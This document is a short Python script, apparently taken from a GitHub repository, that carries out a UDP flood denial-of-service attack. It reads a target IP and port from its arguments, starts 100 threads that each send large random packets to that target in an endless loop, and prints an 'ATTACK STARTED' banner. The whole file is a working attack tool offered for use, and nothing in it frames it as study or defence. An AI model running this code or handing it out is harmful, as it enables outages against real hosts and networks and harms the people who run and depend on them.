import time
import os
import socket
import threading
import sys
import random
# GitHub: oomrefiruk-cpu
# This Code Was Coded By oomrefiruk-cpu
os.system("clear")
print("Please Wait...")
ip = sys.argv[1]
port = int(sys.argv[2])
tcount = 100 # Default
def udpflood(ip, port):
  len = random.randint(1300, 1500)
  raw = os.urandom(len)
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(1000):
      s.sendto(raw, (ip, port))
    s.close()

banner = """
███╗   ██╗ ██████╗ ██╗███████╗███████╗
████╗  ██║██╔═══██╗██║██╔════╝██╔════╝
██╔██╗ ██║██║   ██║██║███████╗█████╗
██║╚██╗██║██║   ██║██║╚════██║██╔══╝
██║ ╚████║╚██████╔╝██║███████║███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚══════╝╚══════╝

"""

# Starting Attack

for i in range(tcount):
  t = threading.Thread(target=udpflood,args=(ip, port), daemon=True)
  t.start()

time.sleep(3)
os.system("clear")
print("\033[34m" + banner)
print(" ")
print("\033[31mATTACK STARTED")
print(" ")
print(f"\033[31mTarget IP: {ip}")
print(f"Target Port: {port}")
print(f"Threads: {tcount}")
print("Type: UDP-FLOOD")
print(" ")
print("Use CTRL + C For Stop.")

while True:
  time.sleep(1)

